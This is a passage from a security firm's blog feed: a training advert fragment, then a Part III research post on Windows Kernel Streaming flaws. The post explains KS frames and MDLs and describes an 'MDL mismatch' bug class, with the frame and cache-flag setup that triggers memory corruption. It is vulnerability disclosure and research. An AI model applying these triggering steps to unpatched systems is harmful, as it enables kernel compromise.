&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;PEN-300&lt;/strong&gt;（Advanced Evasion Techniques and Breaching Defenses）&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;WEB-300&lt;/strong&gt;（Advanced Web Attacks and Exploitation）&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;EXP-401&lt;/strong&gt;（Advanced Windows Exploitation）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果有興趣參加，建議可以早點報名，因為早鳥票價相對非常划算（隨著時間接近，價格會逐步上升）。&lt;br /&gt;
詳細資訊可以參考官方網站：&lt;a href=&quot;https://training.devco.re/2025&quot;&gt;DEVCORE &amp;amp; OffSec Live Training&lt;/a&gt;。
&lt;img src=&quot;/assets/img/blog/20250522/upload_b7cab66943df4921db18bbd3c37487f8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/</link>
                <guid>https://devco.re/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge</guid>
                <pubDate>Thu, 22 May 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Frame by Frame, Kernel Streaming Keeps Giving Vulnerabilities</title>
                <description>&lt;p&gt;This is a series of research related to Kernel Streaming attack surface. It is recommended to read the following articles first.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/&quot;&gt;Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/&quot;&gt;Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part II&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Welcome to Part III of my series on streaming vulnerabilities in the Windows kernel. This research was also presented at &lt;a href=&quot;https://www.offensivecon.org/agenda/2025.html&quot;&gt;OffensiveCon 2025&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Over the past year, we uncovered an overlooked bug class called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Proxying to Kernel&lt;/code&gt;, which led to severe consequences, making exploitation straightforward in Windows kernel. However, this is just the tip of the iceberg for Kernel Streaming.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After discovering several vulnerabilities — including those related to the Proxying series — in Kernel Streaming, we decided to dive deeper into its internals. Between late 2023 and the end of 2024, we identified over 20 vulnerabilities. Approximately 14 of them are related to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/avstream-overview&quot;&gt;AVStream&lt;/a&gt;, with most occurring during frame handling. In this post, I’ll focus on these frame-related issues.&lt;/p&gt;

&lt;p&gt;Let’s talk about kernel streaming frame.&lt;/p&gt;

&lt;h2 id=&quot;brief-overview-of-kernel-streaming-frame&quot;&gt;Brief overview of Kernel Streaming Frame&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In Kernel Streaming, when reading data from a device, Kernel Streaming will allocate KS frame to carry streaming data such as video or audio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;struct _KSPFRAME_HEADER
{
  _LIST_ENTRY ListEntry;
  _KSPFRAME_HEADER *NextFrameHeaderInIrp;
  void *Queue;
  _IRP *OriginalIrp;
  _MDL *Mdl;
  _IRP *Irp;
  KSPIRP_FRAMING_ *IrpFraming;
  KSSTREAM_HEADER *StreamHeader;
  void *FrameBuffer;
  KSPMAPPINGS_TABLE *MappingsTable;
  unsigned int StreamHeaderSize;
  unsigned int FrameBufferSize;
  void *Context;
  int RefCount;
  void *OriginalData;
  void *BufferedData;
  int Status;
  unsigned __int8 DismissalCall;
  _KSPFRAME_HEADER_TYPE Type;
  _KSPSTREAM_POINTER *FrameHolder;
  unsigned int OriginalOptionsFlags;
  _KSPMDLCACHED_STREAM_POINTER *MdlCaching;
};

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The frame buffer inside the KS frame stores the actual image or audio data. Most frame buffers are described by a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_mdl&quot;&gt;Memory Descriptor List (MDL)&lt;/a&gt; that maps their physical memory. If you’re not familiar with what an MDL is, don’t worry — here’s a quick overview.&lt;/p&gt;

&lt;h3 id=&quot;mdl&quot;&gt;MDL&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MDL (Memory Descriptor List)&lt;/code&gt; is a kernel-mode structure used in Windows to describe the physical pages backing a virtual memory buffer. It allows kernel components and drivers to perform direct memory access (DMA) and safely share buffers across different contexts. MDLs are widely used throughout the Windows kernel, commonly in conjunction with IRPs during &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-direct-i-o&quot;&gt;Direct I/O&lt;/a&gt;, as well as in file system and network drivers during data transfer operations.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MDL (Memory Descriptor List)&lt;/code&gt; structure is defined as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;typedef struct _MDL {
  struct _MDL      *Next;
  CSHORT           Size;
  CSHORT           MdlFlags;
  struct _EPROCESS *Process;
  PVOID            MappedSystemVa;
  PVOID            StartVa;
  ULONG            ByteCount;
  ULONG            ByteOffset;
  ULONG64          PFN[];  // Variable-length array of page frame numbers

} MDL, *PMDL;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is a variable-sized structure, where the &lt;strong&gt;PFN (Page Frame Numbers)&lt;/strong&gt; array is stored at the end of the MDL. Each PFN represents the physical page corresponding to a  the virtual buffer described by the MDL.&lt;/p&gt;

&lt;p&gt;In Kernel Streaming, an MDL describes a buffer that is mapped into user space and kernel space, and both mappings refer to the same physical memory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As a result, when data is read from a device, it is written to both the user-mode and kernel-mode buffers at the same time.&lt;/p&gt;

&lt;p&gt;Let’s take a quick look at how MDLs are typically used.&lt;/p&gt;

&lt;h4 id=&quot;basic-usage-of-mdl&quot;&gt;Basic Usage of MDL&lt;/h4&gt;

&lt;p&gt;When the kernel needs to access user-mode memory — especially at elevated IRQL levels such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DISPATCH_LEVEL&lt;/code&gt; or within a DPC — it often relies on an MDL to safely describe and lock that memory. Typically, this process invokes the set of APIs shown in the diagram below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ioallocatemdl&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-ioallocatemdl&quot;&gt;IoAllocateMDL&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First, the kernel calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoAllocateMdl&lt;/code&gt; to allocate an MDL structure, initializing it to describe a buffer based on the provided virtual address and length. &lt;strong&gt;But it does not initialize the PFN (Page Frame Number) array in the MDL.&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;mmprobeandlockpages&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmprobeandlockpages&quot;&gt;MmProbeAndLockPages&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, the kernel calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmProbeAndLockPages&lt;/code&gt; to lock the physical pages corresponding to the virtual address range, and to populate the PFN (Page Frame Number) array inside the MDL.&lt;/p&gt;

&lt;h4 id=&quot;mmmaplockedpagesspecifycache&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmmaplockedpagesspecifycache&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once the kernel needs to access the memory, it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/code&gt; to map a new virtual address &lt;strong&gt;using the PFNs stored in the MDL&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;By the way, it’s also possible to map kernel buffers into user space using this API.&lt;/p&gt;

&lt;h4 id=&quot;mmunlockpagesiofreemdl&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmunlockpages&quot;&gt;MmUnlockPages&lt;/a&gt;/&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iofreemdl&quot;&gt;IoFreeMdl&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;After the kernel has finished using the buffer mapped through the MDL, it must call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmUnlockPages&lt;/code&gt; to release the locked physical pages. Finally, the MDL itself should be freed using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoFreeMdl&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For the purposes of this post, it’s enough to understand that Kernel Streaming uses MDLs to manage frame buffers shared between user space and kernel space.&lt;/p&gt;

&lt;p&gt;If you’re interested in more details about MDL, here are some helpful references:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls&quot;&gt;Using MDLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@WaterBucket/understanding-memory-descriptor-lists-mdls-for-windows-vulnerability-research-exploit-7de8729caee7&quot;&gt;Understanding Memory Descriptor Lists (MDLs) for Windows Vulnerability Research &amp;amp; Exploit Development&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Next, let’s take a look at how a typical application reads data from a webcam — and how Kernel Streaming implements this functionality under the hood.&lt;/p&gt;

&lt;h3 id=&quot;how-to-read-streams-from-webcam&quot;&gt;How to Read Streams from webcam&lt;/h3&gt;

&lt;p&gt;Here is a simplified overview of the workflow for reading a video stream from a webcam using Kernel Streaming:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Open the device to obtain a handle to the webcam device.&lt;/li&gt;
  &lt;li&gt;Use this device handle to create an instance of the Pin on this filter and obtain the Pin handle.&lt;/li&gt;
  &lt;li&gt;Set the Pin’s state to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RUN&lt;/code&gt; using &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_property&quot;&gt;IOCTL_KS_PROPERTY&lt;/a&gt;. When the Pin enters the RUN state, the webcam’s indicator light usually turns on, indicating that the device is active and ready to stream.&lt;/li&gt;
  &lt;li&gt;Finally, you can use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_read_stream&quot;&gt;IOCTL_KS_READ_STREAM&lt;/a&gt; to read data from this Pin. When sending the IOCTL to read the stream, we need to provide a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-ksstream_header&quot;&gt;KSSTREAM_HEADER&lt;/a&gt; structure as input to specify the necessary information.&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;typedef struct {
  ULONG    Size;
  ULONG    TypeSpecificFlags;
  KSTIME   PresentationTime;
  LONGLONG Duration;
  ULONG    FrameExtent; //Buffer Size
  ULONG    DataUsed; 
  PVOID    Data; // point to image Buffer
  ULONG    OptionsFlags;
  ULONG    Reserved;
} KSSTREAM_HEADER, *PKSSTREAM_HEADER;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The kernel will use this structure to copy data from the device into memory. The most important fields are the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data&lt;/code&gt;, which points to your user-space buffer, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FrameExtent&lt;/code&gt;, which indicates the size of the buffer. Kernel Streaming will map a frame buffer based on these values and write the image data into the memory region you provided.  Optionally, you can also use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OptionsFlags&lt;/code&gt; field to describe the attributes of the frame.&lt;/p&gt;

&lt;h3 id=&quot;stream-reading-in-kernel-streaming&quot;&gt;Stream Reading in Kernel Streaming&lt;/h3&gt;
&lt;p&gt;Let’s briefly introduce how ks implements reading a frame.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First, a buffer must be allocated in user space to store the incoming image data.
Then, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; structure is prepared, containing the buffer’s address and size, and passed to the kernel via an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_READ_STREAM&lt;/code&gt;. When this IOCTL is sent to the webcam device, it is handled by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;. If the request does not originate from a WoW64 process, it will be passed to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; for further processing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; receives the request, it parses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt;, creates an MDL based on the provided buffer and size, and insert it to the IRP. The user-space buffer is then mapped into kernel space as a frame buffer through this MDL. At this point, both the user buffer and the frame buffer point to the same physical memory, enabling efficient zero-copy data transfers between user space and kernel space.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; allocates a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS Frame (_KSPFRAME_HEADER)&lt;/code&gt; in kernel. This structure contains the associated MDL, a pointer to the frame buffer, the buffer size, and other metadata used for managing the streaming operation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; is then placed into an internal queue, where it waits to be filled with data.
Next, the Kernel Streaming worker thread dequeues a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; and begins capturing image data from the device into the associated frame buffer. Any remaining &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; structures in the queue will be processed one by one in the order they were enqueued.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By the way, it’s also possible to submit multiple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; structures in a single IOCTL call to request multiple frames. In that case, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will process each frame request in order, based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; array provided in the input buffer. Each frame has a &lt;strong&gt;one-to-one mapping with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt;, an MDL, and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;With the basics of the architecture and frame reading in place, we can now examine things from an attacker’s point of view.&lt;/p&gt;

&lt;h3 id=&quot;from-attackers-perspective&quot;&gt;From Attacker’s Perspective&lt;/h3&gt;

&lt;p&gt;So, where should we focus our attention?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first and most intuitive target is the transition between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;.When 32-bit requests are converted to 64-bit, improper handling of user-controlled &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; structures may lead to memory corruption — for example, &lt;a href=&quot;https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054&quot;&gt;CVE-2024-38054&lt;/a&gt; is one such case. This transition layer can also introduce inconsistency issues.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another interesting target is how &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; manages frame buffers. If MDLs are &lt;strong&gt;misused&lt;/strong&gt; during frame buffer handling, it can result in various forms of memory corruption. We’ll examine some examples of these issues later.&lt;/p&gt;

&lt;p&gt;In the course of our research on Kernel Streaming, we identified several new bug classes worth highlighting.&lt;/p&gt;

&lt;h2 id=&quot;new-bug-classes-in-kernel-streaming&quot;&gt;New Bug Classes in Kernel Streaming&lt;/h2&gt;

&lt;p&gt;The first bug class we identified is MDL mismatch.&lt;/p&gt;

&lt;h3 id=&quot;mdl-mismatch&quot;&gt;MDL Mismatch&lt;/h3&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; receives a 32-bit request, it not only converts the request to its 64-bit equivalent, but also pre-allocates an MDL to describe the frame buffer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As illustrated in the diagram, when a 32-bit request is issued, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; is the first to handle it. During this step, it sets up the MDL and performs the mapping for the frame buffer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; completes its preprocessing, it passes the IRP to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; for further handling. Since the MDL has already been created by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will &lt;strong&gt;not&lt;/strong&gt; allocate a new one. At this point, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; is allocated to represent the frame within the Kernel Streaming framework.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Moreover, if multiple frames are requested in a single call, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; will pre-allocate all the necessary MDLs and perform the corresponding frame buffer mappings.&lt;/p&gt;

&lt;p&gt;However, if the OptionsFlags field is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER_OPTIONSF_PERSIST_SAMPLE (0x8000)&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; will skip the normal MDL allocation process. This flag is actually part of Kernel Streaming’s MDL caching mechanism. While we won’t go into the full details here, it’s important to understand that enabling this flag &lt;strong&gt;causes ksthunk to skip MDL allocation for that frame&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Additionally, since each frame is handled independently, it’s possible to intentionally mark only one of the submitted frames as caching by setting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER_OPTIONSF_PERSIST_SAMPLE&lt;/code&gt; flag on that specific frame when submitting multiple frames in a single request.&lt;/p&gt;

&lt;p&gt;Let me give you an example :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Suppose we submit two frames, with the second frame marked as caching.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; will check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OptionsFlags&lt;/code&gt; field for each frame. If the cache flag is &lt;strong&gt;not&lt;/strong&gt; set, it allocates an MDL and maps the frame buffer accordingly. Since the second frame &lt;strong&gt;has&lt;/strong&gt; the cache flag set, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; will skip MDL allocation for that frame.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, the IRP is passed down to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;, which will once again inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OptionsFlags&lt;/code&gt; field for each frame. However, the logic here is reversed compared to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt;.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;For the first frame — because it doesn’t have the cache flag — ks.sys assumes the MDL has already been allocated by ksthunk, and therefore skips MDL allocation.&lt;/li&gt;
  &lt;li&gt;For the second frame, since the cache flag is set, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will allocate a new MDL and map the frame buffer.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; then creates &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; based on &lt;strong&gt;the order of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; entries&lt;/strong&gt;.
Each KSFRAME is paired one-to-one with its corresponding MDL, and the frames are placed into an internal queue, waiting to be pulled and processed by the worker thread.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;But… is it really safe ?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There seems to be something inconsistent. &lt;strong&gt;Let’s abuse the MDL chain !&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Suppose we submit two frames:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;For the first frame, we set the buffer size to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1000&lt;/code&gt; and enable the cache flag.&lt;/li&gt;
  &lt;li&gt;For the second frame, we set the buffer size to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x20000&lt;/code&gt;, but do not set the cache flag.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; checks each stream header as usual. For the first frame, since &lt;strong&gt;the cache flag is set&lt;/strong&gt;, it &lt;strong&gt;skips&lt;/strong&gt; MDL allocation. For the second frame, since the cache flag is &lt;strong&gt;not&lt;/strong&gt; set, ksthunk allocates a new MDL and maps the frame buffer accordingly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, the IRP is passed down to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt;, which once again inspects the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OptionsFlags&lt;/code&gt; field for each frame.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;For the first frame, since the cache flag is set, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will allocate a new MDL, map the frame buffer, and insert it into the MDL chain.&lt;/li&gt;
  &lt;li&gt;For the second frame, the cache flag is not set, so &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; assumes the MDL has already been allocated by ksthunk, and therefore skips the allocation.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; creates &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt;  based on the MDL chain and the corresponding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; entries. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FrameExtent&lt;/code&gt; field from each header is stored into the associated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt;, defining the expected frame size.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the diagram above, the first frame will have a size of 0x1000 stored, while the second frame will have 0x20000 stored.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Do you notice the problem?&lt;/strong&gt; After we run it …&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Why ?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The root cause of this issue is a mismatch between each &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; and its corresponding MDL. For example, the first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; gets paired with the MDL of the second frame, while the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; ends up linked to the MDL of the first frame.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;What’s the actual impact?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When the worker copies data from the device, it relies on the buffer address and size stored in each &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; to perform the copy operation. Both frames are treated the same — the worker refers to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; structure to determine where and how much data to copy. However, here lies the problem…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

